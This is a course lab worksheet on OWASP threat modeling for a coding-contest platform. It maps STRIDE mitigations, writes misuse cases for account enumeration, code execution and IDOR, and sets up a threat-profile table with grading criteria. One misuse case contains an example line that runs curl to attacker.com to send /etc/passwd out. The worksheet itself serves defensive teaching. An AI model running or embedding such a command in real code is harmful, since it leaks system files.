# Lab 4.5 — OWASP Step 3: Countermeasures, Misuse Cases & Threat Profile

> **Chapter 4 · Threat Modeling and Risk-Driven Prioritization**
> Input: Threat List from Lab 4.4 | Output: Countermeasure Map, ≥4 Misuse Cases, Threat Profile

> [!NOTE]
> **OWASP Note:** OWASP Step 3 produces three key outputs: (1) STRIDE Threat & Mitigation Techniques — standard countermeasures map; (2) Misuse/Abuse Cases — attack stories from a business-flow perspective; (3) Threat Profile — classifying each threat as non-mitigated / partially mitigated / fully mitigated. The Threat Profile is the output most commonly missing in practice.

## Learning Objectives

- Apply the OWASP STRIDE Mitigation Techniques table to CODING WAR.
- Write ≥4 Misuse/Abuse Cases using the full OWASP + book template.
- Build a Threat Profile: classify threats as non-mitigated, partially mitigated, or fully mitigated.

---

## Task 1 — STRIDE Mitigation Techniques (OWASP)

Apply OWASP standard mitigation techniques to each STRIDE category in the CODING WAR context:

| STRIDE | OWASP Standard Techniques | Applied to CODING WAR (specific) | Implementation Status |
|--------|--------------------------|----------------------------------|-----------------------|
| **S** | 1. Appropriate authentication 2. Protect secret data 3. Don't store secrets | \[Fill in: MFA, JWT lifetime, credential storage in CODING WAR\] | \[ \] Implemented \[ \] Planned \[ \] MISSING |
| **T** | 1. Appropriate authorization 2. Hashes / MACs 3. Digital signatures 4. Tamper-resistant protocols | \[Fill in: input validation, HMAC for webhooks, parameterized queries\] | \[ \] Implemented \[ \] Planned \[ \] MISSING |
| **R** | 1. Digital signatures 2. Timestamps 3. Audit trails | \[Fill in: audit log for admin actions, tamper-evident logs, NTP sync\] | \[ \] Implemented \[ \] Planned \[ \] MISSING |
| **I** | 1. Authorization 2. Privacy-enhanced protocols 3. Encryption 4. Protect secrets 5. Don't store secrets | \[Fill in: TLS everywhere, encrypt at rest, generic error messages, PII minimization\] | \[ \] Implemented \[ \] Planned \[ \] MISSING |
| **D** | 1. Appropriate authentication 2. Appropriate authorization 3. Filtering / Throttling 4. Quality of service | \[Fill in: rate limiting, resource quotas per user, circuit breaker, sandbox limits\] | \[ \] Implemented \[ \] Planned \[ \] MISSING |
| **E** | 1. Run with least privilege | \[Fill in: role-based access, object-level AuthZ checks, service accounts with minimal permissions\] | \[ \] Implemented \[ \] Planned \[ \] MISSING |

---

## Task 2 — Misuse/Abuse Cases (OWASP + Book Template)

### MC-01: Account Enumeration via Password Reset (User Enumeration)

| Field | Content |
|-------|---------|
| **Normal Use Case** | Legitimate user → /password/reset → system sends a reset email if the email exists. |
| **Actor (Attacker)** | Anonymous attacker (no account required) |
| **Preconditions** | The /password/reset response differs depending on whether the email exists (message, status code, or Δt response time). |
| **Attack Steps** | 1. Prepare a list of common emails. 2. POST /auth/password-reset for each email. 3. Observe differences: message, status code, response time. 4. Build a list of valid accounts. 5. Cross-reference with breach databases to pivot to account takeover. |
| **Entry Point & Boundary** | POST /api/v1/auth/password-reset (EP-1.5) crossing B1 |
| **Assets at Risk** | Privacy (Asset 1.1), precondition for Account Takeover |
| **STRIDE Mapping** | I (primary — user enumeration), R (secondary) |
| **Detection Criteria** | Pattern: >50 reset requests/hour from the same IP; Δt variance >200ms; bot-like timing patterns. |
| **Mitigations** | 1. Uniform response message regardless of whether email exists. 2. Constant-time check (prevents timing attack). 3. Rate limit: 5 req/hour/IP, 3 req/hour/email. 4. CAPTCHA after 3 attempts. 5. Email-only response (don't confirm existence). 6. Alert when >30 req/hour from one IP. |
| **Owner** | Backend/Auth team + Security team |
| **🔍 Complements Code Review** | Code review check: response message branches, timing of DB lookup, log completeness |

### MC-02: Remote Code Execution via Malicious Submission

| Field | Content |
|-------|---------|
| **Normal Use Case** | Contestant → pastes code → POST /submissions → JudgeService compiles and runs → returns verdict. |
| **Actor (Attacker)** | Malicious contestant (with a valid account) |
| **Preconditions** | Sandbox isolation is insufficient; judge process runs with excessive privileges; no network namespace isolation. |
| **Attack Steps** | 1. Craft code with system calls: `os.system('curl attacker.com/exfil?data=$(cat /etc/passwd)')`. 2. Submit via POST /submissions. 3. JudgeService executes code in a privileged context. 4. Malicious commands run with judge process permissions. 5. Attacker receives exfiltrated data or achieves persistence. |
| **Entry Point & Boundary** | POST /api/v1/submissions (EP-1.4) → Message Queue (EP-2) → JudgeService |
| **Assets at Risk** | Judge server integrity, internal network access, other contestants' data |
| **STRIDE Mapping** | E (primary), I (secondary — exfiltration), D (tertiary — resource bomb) |
| **Detection Criteria** | Outbound network calls from the judge sandbox (should be ZERO); unusual syscall patterns; CPU/memory spikes; external DNS queries from judge nodes. |
| **Mitigations** | 1. gVisor/seccomp sandbox — block ALL syscalls except the minimum required. 2. Network namespace isolation — judge container has NO internet access. 3. Read-only filesystem except /tmp. 4. Hard CPU/memory/time limits (SIGKILL if exceeded). 5. Run as non-root inside container. 6. Monitor all outbound network from judge nodes. |
| **Owner** | Infrastructure/DevOps + Judge Engine team |
| **🔍 Complements Code Review** | Code review check: sandbox configuration files, seccomp profiles, Docker/gVisor settings |

### MC-03: IDOR — Viewing Another Contestant's Submitted Source Code

| Field | Content |
|-------|---------|
| **Normal Use Case** | Contestant submits → receives submission_id → GET /api/v1/submissions/{id} to view their result. |
| **Actor (Attacker)** | Malicious contestant (with a valid account) |
| **Preconditions** | The API only checks authentication (JWT is valid) but does NOT check object ownership (submission.user_id == requesting user.id). |
| **Attack Steps** | 1. Submit, receive own submission_id=100. 2. Modify request: GET /api/v1/submissions/99. 3. API queries: SELECT * FROM submissions WHERE id=99 — without checking user_id. 4. Response returns the full submission including source_code. 5. Repeat: 98, 97, 96... harvest source code from many contestants. |
| **Entry Point & Boundary** | GET /api/v1/submissions/{id} (EP-1.x) crossing B2 |
| **Assets at Risk** | Source code (Asset 2), Contest integrity, Contestant IP |
| **STRIDE Mapping** | E (primary — BOLA/IDOR), I (secondary — source code disclosure) |
| **Detection Criteria** | User calls GET /submissions/{id} for >10 unique IDs/minute that are not their own; sequential ID pattern; access logs show IDs belonging to other users. |
| **Mitigations** | 1. Object-level AuthZ: ALWAYS check `submission.user_id == requesting_user.id`. 2. Log every access with user_id + submission_id. 3. Rate limit: max 10 req/minute/user on /submissions/{id}. 4. Admin access via a separate, audit-logged endpoint. |
| **Owner** | Backend/API team |
| **🔍 Complements Code Review** | Code review check: do all GET/PUT/DELETE endpoints have an object ownership check? |

### MC-04: \[Self-authored\] — Team selects a new attack scenario

> [!WARNING]
> MC-04 is written by the team. Suggestions: Brute force on the Admin Panel, test case leak via contest export, scoreboard manipulation, DoS via complex regex in submitted code.

| Field | Content |
|-------|---------|
| **Normal Use Case** | \[Describe the normal use case — what a legitimate user does\] |
| **Actor (Attacker)** | \[Type of attacker\] |
| **Preconditions** | \[Which controls are missing?\] |
| **Attack Steps** | \[Numbered attack steps\] |
| **Entry Point & Boundary** | \[EP ID\] crossing \[Trust Boundary\] |
| **Assets at Risk** | \[Asset from Register\] |
| **STRIDE Mapping** | \[Primary\] (primary), \[Secondary\] (secondary) |
| **Detection Criteria** | \[Detection signals with thresholds\] |
| **Mitigations** | \[Numbered technical mitigations\] |
| **Owner** | \[Team owner\] |
| **🔍 Complements Code Review** | \[Related code review checks\] |

---

## Task 3 — Threat Profile (OWASP)

> [!NOTE]
> **OWASP Note:** After identifying countermeasures, classify threats into 3 profiles: (1) **Non-mitigated**: no countermeasure → vulnerability is fully exploitable; (2) **Partially mitigated**: ≥1 countermeasure but insufficient → limited impact; (3) **Fully mitigated**: adequate countermeasures → vulnerability is not exposed.

| Threat ID | Threat Summary | Mitigation Status | Evidence / Countermeasures in Place | Residual Risk | Action Required |
|-----------|---------------|------------------|------------------------------------|--------------|----------------|
| **TH-01** | Credential stuffing | ⚠️ PARTIALLY mitigated | TLS: ✓, Rate limit: MISSING, Account lockout: MISSING, MFA: MISSING | HIGH — still exploitable | Add rate limit + lockout ASAP |
| **TH-02** | IDOR /submissions | 🔴 NON-mitigated | JWT auth: ✓, Object-level check: MISSING completely | CRITICAL — fully exploitable | Fix: add user_id ownership check |
| **TH-03** | DoS via submissions | ⚠️ PARTIALLY mitigated | Code sandbox: PLANNED, Resource limits: MISSING, Timeout: MISSING | HIGH — DoS is possible | Implement sandbox + resource limits |
| **TH-04** | Verbose errors | ⚠️ PARTIALLY mitigated | TLS: ✓, but error messages expose internals | MEDIUM — info leakage remains | Sanitize error responses |
| **TH-05** | Missing admin audit log | 🔴 NON-mitigated | No audit logging for admin actions | HIGH — non-repudiation is impossible | Implement append-only audit log |
| **TH-06** | \[Fill in\] | \[🔴 Non / ⚠️ Partial / ✅ Full\] | \[Fill in\] | \[Fill in\] | \[Fill in\] |
| **TH-07** | \[Fill in\] | \[Fill in\] | \[Fill in\] | \[Fill in\] | \[Fill in\] |
| **TH-08** | \[Fill in\] | \[Fill in\] | \[Fill in\] | \[Fill in\] | \[Fill in\] |
| **TH-09** | \[Fill in\] | \[Fill in\] | \[Fill in\] | \[Fill in\] | \[Fill in\] |
| **TH-10** | \[Fill in\] | \[Fill in\] | \[Fill in\] | \[Fill in\] | \[Fill in\] |

**Threat Profile Summary:**

| 🔴 Non-mitigated | ⚠️ Partially mitigated | ✅ Fully mitigated |
|-----------------|----------------------|------------------|
| \[Count + list Threat IDs\] | \[Count + list Threat IDs\] | \[Count + list Threat IDs\] |

---

## Grading Criteria

| Criterion | Points | Description |
|-----------|--------|-------------|
| STRIDE Mitigation Techniques (6 categories) | **24** | Applied specifically to CODING WAR; Implementation Status is honest (not all "Implemented") |
| Misuse Cases (4 cases with Complements Code Review) | **40** | Each MC: full template (8 pts) + realistic Code Review check (2 pts) |
| Threat Profile (≥10 threats) | **36** | Non/Partial/Full classification is correct; Evidence is specific; Residual risk is present after mitigation |
| **Total** | **100** | |

---

*See the reference solution at [solutions/sol-4.5.md](../solutions/sol-4.5.md)*
